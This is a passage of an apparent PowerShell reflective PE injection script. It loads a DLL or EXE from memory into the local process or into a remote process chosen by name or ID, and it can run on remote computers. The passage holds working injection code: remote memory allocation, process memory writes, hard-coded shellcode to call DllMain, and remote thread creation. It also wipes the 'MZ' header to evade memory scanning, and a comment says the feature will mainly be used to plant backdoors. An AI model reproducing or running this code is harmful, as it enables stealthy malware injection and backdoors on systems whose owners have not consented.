	    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	    #	It copies Count bytes from Source to Destination.
	    Function Copy-ArrayOfMemAddresses
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Array[]]
		    $CopyInfo,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants
		    )

		    [UInt32]$OldProtectFlag = 0
		    foreach ($Info in $CopyInfo)
		    {
			    $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			    if ($Success -eq $false)
			    {
				    Throw "Call to VirtualProtect failed"
			    }
			
			    $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			    $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		    }
	    }


	    #####################################
	    ##########    FUNCTIONS   ###########
	    #####################################
	    Function Get-MemoryProcAddress
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [IntPtr]
		    $PEHandle,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [String]
		    $FunctionName
		    )
		
		    $Win32Types = Get-Win32Types
		    $Win32Constants = Get-Win32Constants
		    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		    #Get the export table
		    if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		    {
			    return [IntPtr]::Zero
		    }
		    $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		    $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		    for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		    {
			    #AddressOfNames is an array of pointers to strings of the names of the functions exported
			    $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			    $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			    $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			    if ($Name -ceq $FunctionName)
			    {
				    #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				    #    which contains the offset of the function in to the DLL
				    $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				    $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				    $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				    $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				    return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			    }
		    }
		
		    return [IntPtr]::Zero
	    }


	    Function Invoke-MemoryLoadLibrary
	    {
		    Param(
		    [Parameter( Position = 0, Mandatory = $true )]
		    [Byte[]]
		    $PEBytes,
		
		    [Parameter(Position = 1, Mandatory = $false)]
		    [String]
		    $ExeArgs,
		
		    [Parameter(Position = 2, Mandatory = $false)]
		    [IntPtr]
		    $RemoteProcHandle
		    )
		
		    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		    #Get Win32 constants and functions
		    $Win32Constants = Get-Win32Constants
		    $Win32Functions = Get-Win32Functions
		    $Win32Types = Get-Win32Types
		
		    $RemoteLoading = $false
		    if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		    {
			    $RemoteLoading = $true
		    }
		
		    #Get basic PE information
		    Write-Verbose "Getting basic PE information from the file"
		    $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		    $OriginalImageBase = $PEInfo.OriginalImageBase
		    $NXCompatible = $true
		    if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		    {
			    Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			    $NXCompatible = $false
		    }
		
		
		    #Verify that the PE and the current process are the same bits (32bit or 64bit)
		    $Process64Bit = $true
		    if ($RemoteLoading -eq $true)
		    {
			    $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			    $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			    if ($Result -eq [IntPtr]::Zero)
			    {
				    Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			    }
			
			    [Bool]$Wow64Process = $false
			    $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			    if ($Success -eq $false)
			    {
				    Throw "Call to IsWow64Process failed"
			    }
			
			    if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			    {
				    $Process64Bit = $false
			    }
			
			    #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			    $PowerShell64Bit = $true
			    if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			    {
				    $PowerShell64Bit = $false
			    }
			    if ($PowerShell64Bit -ne $Process64Bit)
			    {
				    throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			    }
		    }
		    else
		    {
			    if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			    {
				    $Process64Bit = $false
			    }
		    }
		    if ($Process64Bit -ne $PEInfo.PE64Bit)
		    {
			    Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		    }
		

		    #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		    Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		    [IntPtr]$LoadAddr = [IntPtr]::Zero
		    if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		    {
			    Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			    [IntPtr]$LoadAddr = $OriginalImageBase
		    }

		    $PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		    $EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		    if ($RemoteLoading -eq $true)
		    {
			    #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			    $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			    #todo, error handling needs to delete this memory if an error happens along the way
			    $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			    if ($EffectivePEHandle -eq [IntPtr]::Zero)
			    {
				    Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			    }
		    }
		    else
		    {
			    if ($NXCompatible -eq $true)
			    {
				    $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			    }
			    else
			    {
				    $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			    }
			    $EffectivePEHandle = $PEHandle
		    }
		
		    [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		    if ($PEHandle -eq [IntPtr]::Zero)
		    { 
			    Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		    }		
		    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		    #Now that the PE is in memory, get more detailed information about it
		    Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		    $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		    $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		    Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
		
		
		    #Copy each section from the PE in to memory
		    Write-Verbose "Copy PE sections in to memory"
		    Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		    #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		    Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		    Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		    #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		    Write-Verbose "Import DLL's needed by the PE we are loading"
		    if ($RemoteLoading -eq $true)
		    {
			    Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		    }
		    else
		    {
			    Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		    }
		
		
		    #Update the memory protection flags for all the memory just allocated
		    if ($RemoteLoading -eq $false)
		    {
			    if ($NXCompatible -eq $true)
			    {
				    Write-Verbose "Update memory protection flags"
				    Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			    }
			    else
			    {
				    Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			    }
		    }
		    else
		    {
			    Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		    }
		
		
		    #If remote loading, copy the DLL in to remote process memory
		    if ($RemoteLoading -eq $true)
		    {
			    [UInt32]$NumBytesWritten = 0
			    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			    if ($Success -eq $false)
			    {
				    Throw "Unable to write shellcode to remote process memory."
			    }
		    }
		
		
		    #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		    if ($PEInfo.FileType -ieq "DLL")
		    {
			    if ($RemoteLoading -eq $false)
			    {
				    Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				    $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				    $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				    $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				    $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			    }
			    else
			    {
				    $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				    if ($PEInfo.PE64Bit -eq $true)
				    {
					    #Shellcode: CallDllMain.asm
					    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				    }
				    else
				    {
					    #Shellcode: CallDllMain.asm
					    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				    }
				    $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				    $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				    $SCPSMemOriginal = $SCPSMem
				
				    Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				    Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				    [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				    Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				    $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				    if ($RSCAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Unable to allocate memory in the remote process for shellcode"
				    }
				
				    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				    if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				    {
					    Throw "Unable to write shellcode to remote process memory."
				    }

				    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				    if ($Result -ne 0)
				    {
					    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				    }
				
				    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			    }
		    }
		    elseif ($PEInfo.FileType -ieq "EXE")
		    {
			    #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			    [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			    [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			    $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			    #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			    #	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			    [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			    Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

			    $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			    while($true)
			    {
				    [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				    if ($ThreadDone -eq 1)
				    {
					    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					    Write-Verbose "EXE thread has completed."
					    break
				    }
				    else
				    {
					    Start-Sleep -Seconds 1
				    }
			    }
		    }
		
		    return @($PEInfo.PEHandle, $EffectivePEHandle)
	    }
	
	
	    Function Invoke-MemoryFreeLibrary
	    {
		    Param(
		    [Parameter(Position=0, Mandatory=$true)]
		    [IntPtr]
		    $PEHandle
		    )
		
		    #Get Win32 constants and functions
		    $Win32Constants = Get-Win32Constants
		    $Win32Functions = Get-Win32Functions
		    $Win32Types = Get-Win32Types
		
		    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		    #Call FreeLibrary for all the imports of the DLL
		    if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		    {
			    [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			    while ($true)
			    {
				    $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				    #If the structure is null, it signals that this is the end of the array
				    if ($ImportDescriptor.Characteristics -eq 0 `
						    -and $ImportDescriptor.FirstThunk -eq 0 `
						    -and $ImportDescriptor.ForwarderChain -eq 0 `
						    -and $ImportDescriptor.Name -eq 0 `
						    -and $ImportDescriptor.TimeDateStamp -eq 0)
				    {
					    Write-Verbose "Done unloading the libraries needed by the PE"
					    break
				    }

				    $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				    $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				    if ($ImportDllHandle -eq $null)
				    {
					    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				    }
				
				    $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				    if ($Success -eq $false)
				    {
					    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				    }
				
				    $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			    }
		    }
		
		    #Call DllMain with process detach
		    Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		    $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		    $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		    $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		    $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		    $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		    if ($Success -eq $false)
		    {
			    Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		    }
	    }


	    Function Main
	    {
		    $Win32Functions = Get-Win32Functions
		    $Win32Types = Get-Win32Types
		    $Win32Constants =  Get-Win32Constants
		
		    $RemoteProcHandle = [IntPtr]::Zero
	
		    #If a remote process to inject in to is specified, get a handle to it
		    if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		    {
			    Throw "Can't supply a ProcId and ProcName, choose one or the other"
		    }
		    elseif ($ProcName -ne $null -and $ProcName -ne "")
		    {
			    $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			    if ($Processes.Count -eq 0)
			    {
				    Throw "Can't find process $ProcName"
			    }
			    elseif ($Processes.Count -gt 1)
			    {
				    $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				    Write-Output $ProcInfo
				    Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			    }
			    else
			    {
				    $ProcId = $Processes[0].ID
			    }
		    }
		
		    #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		    #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
    #		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
    #		{
    #			Write-Verbose "Getting SeDebugPrivilege"
    #			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
    #		}	
		
		    if (($ProcId -ne $null) -and ($ProcId -ne 0))
		    {
			    $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			    if ($RemoteProcHandle -eq [IntPtr]::Zero)
			    {
				    Throw "Couldn't obtain the handle for process ID: $ProcId"
			    }
			
			    Write-Verbose "Got the handle for the remote process to inject in to"
		    }
		

		    #Load the PE reflectively
		    Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		    $PEHandle = [IntPtr]::Zero
		    if ($RemoteProcHandle -eq [IntPtr]::Zero)
		    {
			    $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
		    }
		    else
		    {
			    $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
		    }
		    if ($PELoadedInfo -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to load PE, handle returned is NULL"
		    }
		
		    $PEHandle = $PELoadedInfo[0]
		    $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		    #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		    $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		    if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		    {
			    #########################################
			    ### YOUR CODE GOES HERE
			    #########################################
	            switch ($FuncReturnType)
	            {
	                'WString' {
	                    Write-Verbose "Calling function with WString return type"
				        [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				        if ($WStringFuncAddr -eq [IntPtr]::Zero)
				        {
					        Throw "Couldn't find function address."
				        }
				        $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				        $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				        [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				        Write-Output $Output
	                }

	                'String' {
	                    Write-Verbose "Calling function with String return type"
				        [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				        if ($StringFuncAddr -eq [IntPtr]::Zero)
				        {
					        Throw "Couldn't find function address."
				        }
				        $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				        $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				        [IntPtr]$OutputPtr = $StringFunc.Invoke()
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				        Write-Output $Output
	                }

	                'Void' {
	                    Write-Verbose "Calling function with Void return type"
				        [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				        if ($VoidFuncAddr -eq [IntPtr]::Zero)
				        {
					        Throw "Couldn't find function address."
				        }
				        $VoidFuncDelegate = Get-DelegateType @() ([Void])
				        $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				        $VoidFunc.Invoke() | Out-Null
	                }
	            }
			    #########################################
			    ### END OF YOUR CODE
			    #########################################
		    }
		    #For remote DLL injection, call a void function which takes no parameters
		    elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		    {
			    $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			    if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			    {
				    Throw "VoidFunc couldn't be found in the DLL"
			    }
			
			    $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			    $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			    #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		    }
		
		    #Don't free a library if it is injected in a remote process
		    if ($RemoteProcHandle -eq [IntPtr]::Zero)
		    {
			    Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		    }
		    else
		    {
			    #Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
			    $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			    if ($Success -eq $false)
			    {
				    Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			    }
		    }
		
		    Write-Verbose "Done!"
	    }

	    Main
    }

    #Main function to either run the script locally or remotely
    Function Main
    {
	    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	    {
		    $DebugPreference  = "Continue"
	    }
	
	    Write-Verbose "PowerShell ProcessID: $PID"
	
	    [Byte[]]$PEBytes = $null
	
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            $PEBytes = $Bytes64
        }
        else
        {
            $PEBytes = $Bytes32
        }
	
	    #Verify the image is a valid PE file
	    $e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

        if ($e_magic -ne 'MZ')
        {
            throw 'PE is not a valid PE file.'
        }

        # Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
	    # TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
        $PEBytes[0] = 0
        $PEBytes[1] = 0
	
	    #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	    {
		    $ExeArgs = "ReflectiveExe $ExeArgs"
	    }
	    else
	    {
		    $ExeArgs = "ReflectiveExe"
	    }

	    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	    {
		    Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName)
	    }
	    else
	    {
		    Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName) -ComputerName $ComputerName
	    }
    }

    Main
    }



    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
